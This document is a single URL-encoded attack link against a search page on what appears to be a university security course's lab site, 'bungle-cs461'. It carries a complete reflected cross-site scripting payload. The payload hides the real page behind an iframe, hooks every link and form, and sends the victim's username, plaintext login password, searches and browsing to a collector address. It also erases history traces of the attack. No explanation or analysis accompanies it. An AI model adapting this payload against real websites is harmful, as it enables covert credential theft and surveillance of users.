http://bungle-cs461.cs.illinois.edu/./search?xssdefense=4&q=%3Cscript%3Efunction%20payload(attacker)%20%0A%7B%0A%20%20%20%20%7Bvar%20targetURL%3D%60http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2F%60%7D%0A%20%20%20%20%7Bvar%20firstFlag%20%3D%200%7D%0A%20%20%20%20%7Bvar%20searchFlag%3D0%7D%0A%20%20%20%20%7Bvar%20bufferNext%3D%60%60%7D%0A%0A%20%20%20%20function%20log(data)%20%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%7Bconsole.log(%24.param(data))%7D%0A%20%20%20%20%20%20%20%20%7B%24.get(attacker%2C%20data)%7D%0A%20%20%20%20%7D%0A%20%20%20%20function%20proxy()%20%0A%20%20%20%20%7B%0A%09%0A%20%20%20%20%20%20%20%20%7B%24(%60body%60).contents().hide()%7D%0A%09%0A%20%20%20%20%20%20%20%20%7Bvar%20frameUsed%20%3D%20%24(%60%3Ciframe%20id%3Drecord%3E%60)%0A%20%20%20%20%20%20%20%20.attr(%60src%60%2CtargetURL)%0A%20%20%20%20%20%20%20%20.attr(%60sandbox%60%2C%20%60allow-forms%20allow-scripts%20allow-same-origin%60)%0A%20%20%20%20%20%20%20%20.css(%7B%0A%09%20%20%20%20%20%20%20%20width%3A%20%60100%25%60%2C%0A%09%20%20%20%20%20%20%20%20height%3A%20%60100%25%60%2C%0A%09%20%20%20%20%20%20%20%20background%3A%20%60white%60%2C%0A%09%20%20%20%20%20%20%20%20position%3A%20%60absolute%60%2C%0A%09%20%20%20%20%20%20%20%20border%3A%200%0A%09%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20.appendTo(%60body%60)%0A%20%20%20%20%20%20%20%20.load(function()%20%0A%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%09%20%20%20%20%24(this.contentDocument)%0A%20%20%20%20%20%20%20%20%20%20%20%20.find(%60a%60)%0A%20%20%20%20%20%20%20%20%20%20%20%20.click(function()%20%0A%09%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7Blog(%7Bevent%3A%60nav%60%2C%20user%3A%20%24(%60%23record%60).contents().find(%60%23logged-in-user%60).text()%2Curi%3A%20this.href%7D)%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7Bwindow.history.replaceState(%7B%7D%2C%60%60%2Cthis.href)%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20.end()%0A%20%20%20%20%09%20%20%20%20.find(%60form%60)%0A%20%20%20%20%09%20%20%20%20.submit(function()%20%0A%20%20%20%20%09%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24(this).attr(%60action%60)%3D%3D%60.%2Fsearch%60)%0A%09%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%09%09%7Bwindow.history.replaceState(%7B%7D%2C%60%60%2C%60http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2Fsearch%3Fq%3D%60%20%2B%20%24(%60%23_record%60).contents().find(%60%23query%60).val())%7D%0A%20%20%20%20%20%20%20%20%09%09%7Blog(%7Bevent%3A%60nav%60%2C%20user%3A%20%24(%60%23record%60).contents().find(%60%23logged-in-user%60).text()%2Curi%3A%20%60http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2Fsearch%3F%60%20%2B%20%60q%3D%60%20%2B%20%24(%60%23record%60).contents().find(%60%23query%60).val()%7D)%7D%0A%09%09%09%7BsearchFlag%3D1%7D%0A%09%09%09%7BbufferNext%3D%24(%60%23record%60).contents().find(%60%23query%60).val()%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%09else%20if(%24(this).attr(%60action%60)%20%3D%3D%20%60.%2Flogin%60)%20%0A%09%20%20%20%20%09%7B%0A%20%20%20%20%20%20%20%20%09%09%7Blog(%7Bevent%3A%20%60login%60%2C%20user%3A%20%20%24(this).serialize().substring(%20%24(this).serialize().indexOf(%60%3D%60)%20%2B%201%2C%20%20%24(this).serialize().indexOf(%60%26%60))%2C%20pass%3A%20%20%24(this).serialize().substring(%20%24(this).serialize().lastIndexOf(%60%3D%60)%20%2B%201%2C%20%20%24(this).serialize().length)%7D)%7D%0A%09%09%09%7Bwindow.history.replaceState(%7B%7D%2C%60%60%2CtargetURL)%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%20if(%24(this).attr(%60action%60)%20%3D%3D%20%60.%2Flogout%60)%0A%09%20%20%20%20%09%7B%0A%20%20%20%20%20%20%20%20%20%20%20%09%09%7Blog(%7Bevent%3A%20%60logout%60%2C%20user%3A%20%24(%60%23record%60).contents().find(%60%23logged-in-user%60).text()%7D)%7D%0A%09%09%09%7Bwindow.history.replaceState(%7B%7D%2C%60%60%2CtargetURL)%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20.end()%0A%0A%09%20%20%20%20%7B%24(%60%23record%60).contents().find(%60.history-item%60).remove(%60%3Acontains(attacker)%60)%7D%0A%09%20%20%20%20if(firstFlag%20%3D%3D%200)%0A%09%20%20%20%20%7B%0A%09%20%20%20%20%20%20%20%20%7Bwindow.history.replaceState(%7B%7D%2C%60%60%2CtargetURL)%7D%0A%09%20%20%20%20%20%20%20%20%7Blog(%7Bevent%3A%20%60nav%60%2C%20user%3A%20%24(%60%23record%60).contents().find(%60%23logged-in-user%60).text()%2Curi%3A%20targetURL%7D)%7D%0A%09%20%20%20%20%20%20%20%20%7BfirstFlag%20%3D%201%7D%0A%20%20%20%09%20%20%20%20%7D%0A%0A%09%20%20%20%20if(searchFlag)%7B%0A%09%09%09%7Bwindow.history.replaceState(%7B%7D%2C%60%60%2C%60http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2Fsearch%3Fq%3D%60%2BbufferNext)%7D%0A%09%09%09%7BsearchFlag%20%3D%200%7D%0A%09%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D)%7D%0A%20%20%20%20%7D%0A%20%20%20%20%7Bproxy()%7D%0A%7D%7Bpayload(%60http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%60)%7D%3C%2Fscript%3E
